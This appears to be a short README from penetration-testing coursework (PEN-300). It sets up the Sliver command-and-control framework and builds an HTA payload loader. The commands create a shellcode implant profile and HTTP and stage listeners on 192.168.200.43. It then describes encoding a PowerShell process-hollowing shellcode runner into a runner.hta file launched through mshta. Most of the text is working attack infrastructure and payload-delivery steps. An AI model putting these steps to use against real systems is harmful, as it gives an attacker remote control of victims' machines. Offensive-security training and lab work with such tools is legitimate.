# Overview

# Sliver Setup
## Create profile local64 and point to port 443
`sliver > profiles new --http 192.168.200.43:80 --format shellcode local64`

## Setup main listener with google.crt / key generated with metasploit
`sliver > http -L 192.168.200.43 -l 80`

## Setup the main stager with unzip key / decryption keys 
`sliver > stage-listener --url tcp://192.168.200.43:8064 --profile local64`

# Sliver HTA Payload
the payload is specific to the Process Hollowing payload that works with the https sliver profile
Run the powershell encoder to convert the sliver.ps1 to usable format for the hta powershell code runner within hta file

## Modify the runner.xml
Modify the runner.xml and change the ip address and runner.ps1 (or .txt) which will be the shell code runner, reference the PEN-300/sliver folder for simple shell code runner .ps1 

## Encoding
The xml requires base64 encoding and placed into the runner.hta file within the powershell command to execute the mshta file. 
`PS Z:\SharedVMFolder\ToolLibrary\Sliver-Basic-HTA-Loader> .\HTA-powershellEncoder.ps1`
Copy and paste the output from the encoded.txt file into the runner.hta file. 